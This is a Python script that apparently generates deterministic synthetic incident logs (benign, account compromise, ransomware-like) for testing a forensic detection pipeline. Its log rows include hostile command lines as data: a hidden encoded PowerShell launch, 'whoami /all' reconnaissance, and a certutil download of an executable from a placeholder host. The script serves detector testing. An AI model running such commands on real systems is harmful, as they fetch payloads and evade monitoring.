#!/usr/bin/env python3
"""Generate the seeded synthetic incident scenarios shipped with FORENSIGHT AI.

All output is entirely synthetic. Every identity, host, address and domain is
fictional and drawn from documentation ranges (RFC 5737 / RFC 2606). Nothing
here originates from a real system, person or incident.

Three corpora are written under ``demo/scenarios/incidents/``:

* ``A/`` - benign control. No rule-triggering pattern. The pipeline is expected
  to stay quiet, which demonstrates the absence of false alarms.
* ``B/`` - account compromise. Brute-force burst, success from an external
  address, rapid multi-origin login, scripting host, reconnaissance browsing,
  targeted reads and an outbound callback.
* ``C/`` - ransomware-like. Payload download, scripting host with evasion
  tokens, sustained mass file modification, a rename burst, and an outbound
  callback.

The corpora are deterministic: timestamps are computed from fixed offsets and
selection uses a seeded RNG, so re-running the script reproduces identical
bytes. Each corpus spans well over ``ML_MIN_WINDOWS`` five-minute windows so
anomaly scoring engages rather than abstaining.

Usage::

    python demo/generate_scenarios.py [--check]

``--check`` regenerates into a temporary directory and compares SHA-256
digests against the committed files instead of overwriting them.
"""

from __future__ import annotations

import csv
import hashlib
import json
import random
import shutil
import sys
import tempfile
from datetime import datetime, timedelta
from pathlib import Path

SEED = 42
BASE = Path(__file__).resolve().parent / "scenarios" / "incidents"

# --- fictional identity pool -------------------------------------------------
USERS = ("usr_alice", "usr_bob", "usr_dana")
HOSTS = ("WS-01", "WS-03", "SRV-FILE01")
# RFC 1918 private space -> treated as internal by the external-IP helper.
INTERNAL_IPS = ("10.20.30.10", "10.20.30.15", "10.20.30.20")
# RFC 5737 TEST-NET ranges -> treated as external, and reserved for docs.
CALLBACK_IP = "198.51.100.7"
PAYLOAD_IP = "203.0.113.5"
# RFC 2606 reserved TLD.
WORKSTATION = "mail.example"
PORTAL = "portal.example"
FILEDOM = "fileshare.example"

# --- CSV headers, matching the shipped edge-case corpus exactly -------------
AUTH_HEADER = ["timestamp", "user", "host", "source_ip", "action", "result"]
PROCESS_HEADER = [
    "timestamp", "host", "user", "process", "action",
    "pid", "parent_process", "command_line",
]
FILE_HEADER = ["timestamp", "user", "host", "file_path", "action", "result"]
NETWORK_HEADER = [
    "timestamp", "host", "process", "source_ip",
    "destination_ip", "destination_port", "protocol", "action",
]
BROWSER_HEADER = ["timestamp", "user", "host", "url", "domain", "action"]

# Each scenario is stretched by this factor. It matters for more than realism:
# the segment classifier (Phase 9b) cuts fixed 10-minute windows, so a corpus
# too short to yield a workable number of labelled windows per class would
# leave the classifier permanently abstaining. Stretching the timeline AND
# scaling event counts keeps the events-per-window density unchanged, so the
# windows triple while the features stay as informative as before.
DILATION = 3


def dilate(delta: dict) -> dict:
    """Scale minute/second offsets so the scenario covers DILATION times longer."""
    out = dict(delta)
    for key in ("minutes", "seconds"):
        if key in out:
            out[key] = out[key] * DILATION
    return out

# Each scenario spans roughly a working session (minutes -> hours). The
# durations matter for more than realism: the segment classifier (Phase 9b)
# cuts fixed 10-minute windows, and a corpus too short to yield a workable
# number of labelled windows per class would leave the classifier permanently
# abstaining. Wider spans give both anomaly scoring and segment classification
# enough material to be meaningful.
BENIGN_MINUTES = 200
COMPROMISE_MINUTES = 230
RANSOMWARE_MINUTES = 220


def scale(minutes: float, total: float) -> float:
    """Spread a `total`-minute event budget across a longer scenario span."""
    return minutes


def ts(base: datetime, **delta) -> str:
    """Format a timestamp offset from ``base`` as the parser's ISO-ish form.

    Offsets are *not* scaled here. Event loops were widened from ``range(n)`` to
    ``range(n * DILATION)``, and since each offset is derived from the loop
    index, that alone stretches the timeline by the same factor and triples the
    number of 10-minute windows while holding events-per-window density
    constant. Dilating again in this helper would stretch the span by
    ``DILATION ** 2`` and quietly starve the windows.
    """
    return (base + timedelta(**delta)).strftime("%Y-%m-%d %H:%M:%S")


def write_csv(path: Path, header: list[str], rows: list[list[str]]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.writer(handle, lineterminator="\n")
        writer.writerow(header)
        writer.writerows(rows)


def write_json(path: Path, events: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as handle:
        json.dump({"events": events}, handle, indent=2)
        handle.write("\n")


# --------------------------------------------------------------------------
# Scenario A - benign control
# --------------------------------------------------------------------------
def scenario_a() -> dict[str, list]:
    """A quiet shift of routine office activity. No rule-triggering shape.

    Built from a single repeating cadence rather than six independent ones.
    That is a deliberate design choice, not an accident: when each source had
    its own period, some five-minute windows happened to contain a network
    event and others did not, and anomaly detection correctly flagged that
    change in *composition* — which is exactly what it is for. For a control
    corpus whose job is to demonstrate "no incident", the activity should be
    rhythmically steady so that anything the detector reports is attributable
    to the detector being wrong rather than to the data being lumpy.

    The cadence below emits the same bundle every tick, and a tick period that
    divides the analysis window, so each window sees an identical mix.
    """
    base = datetime(2026, 10, 5, 8, 0, 0)
    tick_minutes = 2.5
    ticks = int(BENIGN_MINUTES / tick_minutes)

    auth: list[list[str]] = []
    process: list[list[str]] = []
    files: list[list[str]] = []
    network: list[list[str]] = []
    browser: list[list[str]] = []
    logs: list[dict] = []

    pid = 4000
    for i in range(ticks):
        moment = i * tick_minutes
        # Identity rotation advances once per analysis window (two ticks), not
        # once per tick. Rotating per tick would change the user/host mix
        # exactly on window boundaries, and anomaly detection would rightly
        # report that as a compositional shift. Holding the pair steady for a
        # window is also closer to reality: the same person is active
        # throughout an interval rather than swapping every few minutes.
        slot = i // 2
        user = USERS[slot % len(USERS)]
        host = HOSTS[slot % 2]
        stamp = ts(base, minutes=moment)

        # --- steady background: the same shape on every tick ---
        auth.append([
            stamp,
            user,
            host,
            INTERNAL_IPS[slot % len(INTERNAL_IPS)],
            "logout" if i % 8 == 7 else "login",
            "success",
        ])

        pid += 7
        process.append([
            stamp,
            host,
            user,
            "explorer.exe",
            "start",
            str(pid),
            "explorer.exe",
            "explorer.exe",
        ])

        files.append([
            ts(base, minutes=moment, seconds=10),
            user,
            host,
            f"C:\\Users\\{user}\\Documents\\quarterly_{i:03d}.xlsx",
            "open",
            "success",
        ])

        network.append([
            ts(base, minutes=moment, seconds=20),
            host,
            "chrome.exe",
            INTERNAL_IPS[0],
            PAYLOAD_IP,
            "443",
            "tcp",
            "connect",
        ])

        domain = WORKSTATION if i % 2 == 0 else PORTAL
        browser.append([
            ts(base, minutes=moment, seconds=25),
            user,
            host,
            f"https://{domain}/page/{i}",
            domain,
            "visit",
        ])

        logs.append({
            "timestamp": ts(base, minutes=moment, seconds=30) + "Z",
            "event_type": "system.info",
            "source": "system",
            "host": host,
            "user": user,
            "message": f"routine checkpoint {i}",
        })

    return {
        "authentication.csv": (AUTH_HEADER, auth),
        "process.csv": (PROCESS_HEADER, process),
        "file_activity.csv": (FILE_HEADER, files),
        "network.csv": (NETWORK_HEADER, network),
        "browser.csv": (BROWSER_HEADER, browser),
        "system_logs.json": logs,
    }


# --------------------------------------------------------------------------
# Scenario B - account compromise
# --------------------------------------------------------------------------
def scenario_b() -> dict[str, list]:
    """Brute force -> external success -> recon -> script -> targeted reads."""
    base = datetime(2026, 10, 6, 22, 0, 0)
    victim = "usr_alice"
    host = "WS-01"

    # 8 failures inside 2 minutes, then success 2 minutes later -> AUTH-001.
    auth = [
        [ts(base, seconds=i * 12), victim, host, CALLBACK_IP, "login", "failure"]
        for i in range(8)
    ]
    auth.append([ts(base, minutes=2), victim, host, CALLBACK_IP, "login", "success"])
    # 6 further external logins -> AUTH-002 (needs >= RULE_AUTH002_MIN_EXTERNAL_LOGINS).
    for i in range(6 * DILATION):
        auth.append([
            ts(base, minutes=4 + i * 3),
            victim,
            host,
            CALLBACK_IP,
            "login",
            "success",
        ])
    # Two logins seconds apart from different addresses -> AUTH-003.
    auth.append([ts(base, minutes=40), victim, host, INTERNAL_IPS[0], "login", "success"])
    auth.append([ts(base, minutes=40, seconds=25), victim, host, CALLBACK_IP, "login", "success"])

    # Benign background process activity first (keeps the window distribution
    # realistic), then the scripting host -> PROC-001.
    process = []
    pid = 8000
    for i in range(40 * DILATION):
        pid += 11
        process.append([
            ts(base, minutes=i * 1.2),
            host,
            victim,
            "explorer.exe",
            "start",
            str(pid),
            "explorer.exe",
            "explorer.exe",
        ])
    process.append([
        ts(base, minutes=6),
        host,
        victim,
        "powershell.exe",
        "start",
        "9101",
        "explorer.exe",
        "powershell -nop -w hidden -enc SQBFAFgA",
    ])
    process.append([
        ts(base, minutes=20),
        host,
        victim,
        "cmd.exe",
        "start",
        "9140",
        "explorer.exe",
        "cmd /c whoami /all",
    ])

    # Targeted reads of sensitive documents.
    files = []
    for i in range(18 * DILATION):
        files.append([
            ts(base, minutes=10 + i * 2),
            victim,
            host,
            f"C:\\Users\\{victim}\\Documents\\confidential_{i % 4}.docx",
            "read",
            "success",
        ])
    for i in range(12 * DILATION):
        files.append([
            ts(base, minutes=46 + i * 2),
            victim,
            host,
            f"C:\\Users\\{victim}\\Documents\\roster_{i:02d}.csv",
            "open",
            "success",
        ])

    # Outbound callback shortly after the script -> NET-001.
    network = []
    for i in range(10 * DILATION):
        network.append([
            ts(base, minutes=i * 3),
            host,
            "chrome.exe",
            INTERNAL_IPS[0],
            PAYLOAD_IP,
            "443",
            "tcp",
            "connect",
        ])
    for i in range(4 * DILATION):
        network.append([
            ts(base, minutes=26 + i),
            host,
            "powershell.exe",
            INTERNAL_IPS[0],
            CALLBACK_IP,
            "9001",
            "tcp",
            "connect",
        ])

    # Reconnaissance sweep.
    browser = []
    for i in range(24 * DILATION):
        browser.append([
            ts(base, minutes=3 + i * 1.5),
            victim,
            host,
            f"https://{FILEDOM}/share?page={i}",
            FILEDOM,
            "visit",
        ])

    logs = [
        {
            "timestamp": ts(base, minutes=5 + i * 1.5) + "Z",
            "event_type": "system.warning",
            "source": "system",
            "host": host,
            "user": victim,
            "message": f"policy event {i}",
        }
        for i in range(24)
    ]

    return {
        "authentication.csv": (AUTH_HEADER, auth),
        "process.csv": (PROCESS_HEADER, process),
        "file_activity.csv": (FILE_HEADER, files),
        "network.csv": (NETWORK_HEADER, network),
        "browser.csv": (BROWSER_HEADER, browser),
        "system_logs.json": logs,
    }


# --------------------------------------------------------------------------
# Scenario C - ransomware-like
# --------------------------------------------------------------------------
def scenario_c() -> dict[str, list]:
    """Download -> script with evasion tokens -> mass modify + rename -> callback."""
    base = datetime(2026, 10, 7, 2, 0, 0)
    victim = "usr_dana"
    host = "SRV-FILE01"

    auth = []
    for i in range(24 * DILATION):
        auth.append([
            ts(base, minutes=i * 2),
            victim,
            host,
            INTERNAL_IPS[2],
            "login",
            "success",
        ])

    process = []
    pid = 12000
    for i in range(30 * DILATION):
        pid += 13
        process.append([
            ts(base, minutes=i * 1.5),
            host,
            victim,
            "excel.exe",
            "start",
            str(pid),
            "explorer.exe",
            "excel.exe",
        ])
    process.append([
        ts(base, minutes=4),
        host,
        victim,
        "powershell.exe",
        "start",
        "13101",
        "excel.exe",
        "powershell -nop -w hidden -enc <base64blob>",
    ])
    process.append([
        ts(base, minutes=30),
        host,
        victim,
        "certutil.exe",
        "start",
        "13150",
        "powershell.exe",
        "certutil -urlcache -split -f http://fileshare.example/p.exe",
    ])

    # Sustained mass modification: 24 writes per 10-minute window across many
    # windows -> FILE-001 (>= 6 per 15 min window, >= 15 escalates to High).
    files = []
    for i in range(150 * DILATION):
        files.append([
            ts(base, minutes=10 + i * 0.4),
            victim,
            host,
            f"D:\\Finance\\ledger_{i:04d}.csv",
            "write",
            "success",
        ])
    # Rename burst -> FILE-002 (>= 3 renames in a 10-minute window).
    for i in range(14 * DILATION):
        files.append([
            ts(base, minutes=74 + i * 0.3),
            victim,
            host,
            f"D:\\Finance\\ledger_{i:04d}.csv.locked",
            "rename",
            "success",
        ])

    network = []
    for i in range(18 * DILATION):
        network.append([
            ts(base, minutes=i * 2),
            host,
            "chrome.exe",
            INTERNAL_IPS[2],
            PAYLOAD_IP,
            "443",
            "tcp",
            "connect",
        ])
    for i in range(5 * DILATION):
        network.append([
            ts(base, minutes=34 + i),
            host,
            "certutil.exe",
            INTERNAL_IPS[2],
            CALLBACK_IP,
            "443",
            "tcp",
            "connect",
        ])

    browser = []
    for i in range(6 * DILATION):
        browser.append([
            ts(base, minutes=2 + i),
            victim,
            host,
            f"https://{FILEDOM}/update/toolkit_{i}.zip",
            FILEDOM,
            "download",
        ])

    logs = [
        {
            "timestamp": ts(base, minutes=6 + i) + "Z",
            "event_type": "system.warning",
            "source": "system",
            "host": host,
            "user": victim,
            "message": f"mass modification alert {i}",
        }
        for i in range(20)
    ]

    return {
        "authentication.csv": (AUTH_HEADER, auth),
        "process.csv": (PROCESS_HEADER, process),
        "file_activity.csv": (FILE_HEADER, files),
        "network.csv": (NETWORK_HEADER, network),
        "browser.csv": (BROWSER_HEADER, browser),
        "system_logs.json": logs,
    }


SCENARIOS = {
    "A": scenario_a,
    "B": scenario_b,
    "C": scenario_c,
}


def emit(target: Path, name: str) -> list[str]:
    """Write one scenario into ``target/name`` and return its file names."""
    data = SCENARIOS[name]()
    out = target / name
    written = []
    for filename, payload in data.items():
        path = out / filename
        if filename.endswith(".json"):
            write_json(path, payload)
        else:
            header, rows = payload
            write_csv(path, header, rows)
        written.append(filename)
    return sorted(written)


def digest(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def check() -> int:
    """Verify the committed corpora match a fresh generation, byte for byte."""
    scratch = Path(tempfile.mkdtemp(prefix="scenario_check_"))
    failures = 0
    try:
        for name in sorted(SCENARIOS):
            emit(scratch, name)
            committed = BASE / name
            for path in sorted((scratch / name).iterdir()):
                rel = path.relative_to(scratch / name)
                target = committed / rel
                if not target.is_file():
                    print(f"MISSING  {name}/{rel.name}")
                    failures += 1
                elif digest(path) != digest(target):
                    print(f"DRIFTED  {name}/{rel.name}")
                    failures += 1
    finally:
        shutil.rmtree(scratch, ignore_errors=True)
    if failures:
        print(f"check FAILED: {failures} file(s) differ from a fresh generation")
        return 1
    print("check OK: committed scenarios match a fresh seeded generation")
    return 0


def main() -> int:
    if len(sys.argv) > 1 and sys.argv[1] == "--check":
        return check()

    rng = random.Random(SEED)
    # The RNG is seeded so any future selection logic stays reproducible.
    rng.random()

    for name in sorted(SCENARIOS):
        files = emit(BASE, name)
        total = sum(1 for _ in files)
        print(f"wrote scenario {name}: {total} files -> {BASE / name}")
    print("\nAll corpora are entirely synthetic (RFC 5737 / RFC 2606 ranges).")
    print("Regenerate with: python demo/generate_scenarios.py")
    print("Verify drift with: python demo/generate_scenarios.py --check")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())